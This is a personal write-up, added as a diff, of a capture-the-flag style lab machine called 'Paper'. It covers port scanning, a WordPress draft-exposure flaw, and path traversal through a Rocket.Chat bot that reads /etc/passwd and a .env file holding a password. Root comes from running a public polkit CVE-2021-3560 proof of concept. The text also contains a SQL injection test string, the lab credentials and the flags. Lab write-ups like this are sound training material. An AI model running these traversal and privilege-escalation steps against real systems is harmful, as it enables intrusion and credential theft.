@@ -1,0 +1,194 @@
+# Paper Write-Up
+
+Target: 10.10.11.143
+
+---
+
+## Introduction
+- Target Overview: Paper is an accessible Linux machine that showcases a straightforward penetration testing scenario. It hosts an Apache server operating on ports 80 and 443, delivering HTTP and HTTPS versions of a website. The HTTP site displays a standard server page, but careful inspection of the response headers uncovers a concealed domain. This domain hosts a WordPress blog, which exhibits a security flaw that can be leveraged to access sensitive data within its draft posts. This information directs us to an additional URL, revealing an employee chat system powered by Rocketchat. Within the chat environment, a bot is present and can be interacted with to extract useful details, including a user's system password. Further exploration of the host highlights a vulnerability in the sudo configuration, which can be exploited to gain elevated root privileges.
+- Objective: Gather the User and the Root flag
+- Tools:tmux, nmap, burpsuite
+
+---
+
+## Initial Reconnaissance
+	- Port Scanning: nmap default scan
+		- Command:nmap -vv -sV -sC 10.10.11.143 >> paper.txt
+		- Output: 22/ OpenSSH		80/Apache Server	443/Apache Server
+	- Observations: both web servers lead to a HTTP server test page
+					plugging http://10.10.11.143:80 request into burpsuite I learned that there is a wordpress server domain of "office.paper"
+
+---
+
+## Enumeration
+	- Service Exploration:
+		- Service 1: Using hubot on rocket.chat
+			- Command: file ../../../../etc/passwd
+			- Output: rocketchat❌1001:1001::/home/rocketchat:/bin/bash
+						dwight❌1004:1004::/home/dwight:/bin/bash
+		- Service 2: Using hubot on rocket chat 
+			- Command: file ../hubot/.env
+			- Output:	export ROCKETCHAT_USER=recyclops
+						export ROCKETCHAT_PASSWORD=Queenofblad3s!23
+	- Manual Checks: 
+		* blog post "Feeling Alone!" has a comment from nick stating "you should remove the secret content from your drafts ASAP, they are not that secure as you think". c
+		* Searched up how to get version for wordpress. Checked the /feed/ directory and was able to pull version: 
+		<generator>https://wordpress.org/?v=5.2.3</generator>
+		* /?static=1 reveals hidden posts/drafts
+		* checked for sql injection on login page: admin' OR '1'='1' -- -
+	- Key Findings: 
+		WordPress 5.2.3	
+		http://chat.office.paper/register/8qozr226AhkCHZdyY		new subdomain chat.office.paper
+		http://chat.office.paper/home	login page
+		admin username exists in chat service
+		rocketchat is a user with /home
+
+---
+
+## Exploitation: Getting Successful Login Tokens
+	- Initial Access: Using Rocket.chat logins I made through the register link
+		- Command:
+		- Output:
+	- Shell Access: Using the logins found in the .env folder
+		- Command:  ssh dwight@10.10.11.143
+					password: Queenofblad3s!23
+		- Output:   [dwight@paper ~]$
+## Post-Exploitation
+	- Flag Retrieval: Inside dwight /home
+		- Command: cat user.txt
+		- Output: bf9dfd086e1b46bd41b354e6ebd7a14b
+	- Persistence (Optional):
+	- Evidence:
+---
+
+## Privilege Escalation
+	- Step 1: Information Gathering:
+		- System Info:
+			- Command: uname -a
+			- Output: Linux paper 4.18.0-348.7.1.el8_5.x86_64 #1 SMP Wed Dec 22 13:25:12 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
+			
+			- Command: cat /etc/os-release
+			- Output: NAME="CentOS Linux"
+						VERSION="8"
+						ID="centos"
+						ID_LIKE="rhel fedora"
+						VERSION_ID="8"
+						PLATFORM_ID="platform:el8"
+						PRETTY_NAME="CentOS Linux 8"
+						ANSI_COLOR="0;31"
+						CPE_NAME="cpe:/o:centos:centos:8"
+						HOME_URL="https://centos.org/"
+						BUG_REPORT_URL="https://bugs.centos.org/"
+						CENTOS_MANTISBT_PROJECT="CentOS-8"
+						CENTOS_MANTISBT_PROJECT_VERSION="8"
+			- Command: 
+
+		- User Context:
+			- Command: id 
+			- Output: uid=1004(dwight) gid=1004(dwight) groups=1004(dwight)
+		- Automated Tools:
+			- Command:
+			- Output:
+	- Step 2: Identify Vectors:
+		- SUID Binaries:
+			- Command: find / -perm -u=s -type f 2>/dev/null
+			- Output:  
+				/usr/bin/fusermount
+				/usr/bin/chage
+				/usr/bin/gpasswd
+				/usr/bin/newgrp
+				/usr/bin/mount
+				/usr/bin/su
+				/usr/bin/umount
+				/usr/bin/crontab
+				/usr/bin/passwd
+				/usr/bin/chfn
+				/usr/bin/chsh
+				/usr/bin/at
+				/usr/bin/sudo
+				/usr/bin/fusermount3
+				/usr/sbin/grub2-set-bootflag
+				/usr/sbin/pam_timestamp_check
+				/usr/sbin/unix_chkpwd
+				/usr/sbin/userhelper
+				/usr/sbin/mount.nfs
+				/usr/lib/polkit-1/polkit-agent-helper-1
+		- Cron Jobs:
+			- Command: crontab -l
+			- Output: @reboot /home/dwight/bot_restart.sh >> /home/dwight/hubot/.hubot.log 2>&1
+		- Kernel Exploits:
+			- Command: 
+			- Output: 
+		- Misconfigurations:
+			- Command:
+			- Output:
+	- Step 3: Exploit the Vector: 	Exploit Polkit 		0.115-6		CVE-2021-3560
+		- Command: git clone https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation.git polkitcve
+		- Output: ~/Desktop/LABS/paper/polkitcve 
+		
+		- Command: scp ~/Desktop/LABS/paper/polkitcve/poc.sh dwight@10.10.11.143:/home/dwight/polkit.sh
+		- Output: poc.sh                                                  100% 9627    70.2KB/s   00:00
+		
+		- Command: chmod +x polkit.sh
+		
+		- Command: ./polkit.sh
+		- Output: 
+				[!] Username set as : blake20:31:14 [10/588]
+				[!] No Custom Timing specified.
+				[!] Timing will be detected Automatically
+				[!] Force flag not set.
+				[!] Vulnerability checking is ENABLED!
+				[!] Starting Vulnerability Checks...
+				[!] Checking distribution...
+				[!] Detected Linux distribution as "centos"
+				[!] Checking if Accountsservice and Gnome-Control-Center is installed
+				[+] Accounts service and Gnome-Control-Center Installation Found!!
+				[!] Checking if polkit version is vulnerable
+				[+] Polkit version appears to be vulnerable!!
+				[!] Starting exploit...
+				[!] Inserting Username blake...
+				Error org.freedesktop.Accounts.Error.PermissionDenied: Authentication is required
+				[+] Inserted Username blake  with UID 1005!
+				[!] Inserting password hash...
+				[!] It looks like the password insertion was succesful!
+				[!] Try to login as the injected user using su - blake
+				[!] When prompted for password, enter your password 
+				[!] If the username is inserted, but the login fails; try running the exploit again.
+				[!] If the login was succesful,simply enter 'sudo bash' and drop into a root shell! 
+
+	- Step 4: Verify Access:
+		- Command:su blake # password: pass1
+		- Output: [blake@paper dwight]$
+		
+		- Command: sudo bash # password: pass1
+		- Output: [root@paper dwight]#
+
+---
+
+## Post-Exploitation
+	- Flag Retrieval: 
+		- Command: cd /root && cat root.txt
+		- Output: a4266104b9dc9ea0d490fa51bb0cbdf7
+	- Persistence (Optional):
+	- Evidence:
+
+---
+
+## Conclusion
+- Summary: In the "Paper" lab (10.10.11.143), I started with an Nmap scan, spotting Apache on ports 80/443. Using Burp Suite, I found the office.paper WordPress domain (5.2.3), vulnerable to CVE-2019-17671. This let me access draft posts, revealing a Rocket.Chat link (chat.office.paper). I registered, then used the recyclops bot to extract dwight’s password (Queenofblad3s!23) from /hubot/.env, logging in via SSH. For root, I exploited Polkit with CVE-2021-3560, creating user blake (pass1) to gain root access. I grabbed the user flag (bf9dfd086e1b46bd41b354e6ebd7a14b) and root flag (a4266104b9dc9ea0d490fa51bb0cbdf7). It felt rewarding!
+- Lessons Learned: Just use the premade github PoC. I tried to do the polkit vulnerability on own and wasted hours. I also wasted time by not just looking into polkit once I saw the SUID was the only one coming from a different directory. I kept messing with the chatbot seeing if I could do something with it. When the whole time I should have been looking for the polkit exploit, I could have saved myself hours there too. If an exploit is timing based... understand that it may just not be working the first couple times. I was stressing about the exploit not working, but it just had to be ran a few times to make sure the password was getting set for the account "blake" in this instance.
+
+---
+
+## Appendix
+- Additional Details:
+Polkit exploit required multiple attempts due to timing issues. Bot directory /hubot contained .env with credentials. WordPress draft revealed Rocket.Chat URL.
+- Tools and Exploits:
+		Nmap: Port scanning.
+		Burp Suite: HTTP header analysis.
+		FFUF: Subdomain enumeration.
+		Rocket.Chat: Chatbot interaction.
+		Hubot: Bot for file access.
+		CVE-2019-17671: WordPress draft access.
+		CVE-2021-3560: Polkit privilege escalation.
+		OpenSSL: Password hashing.
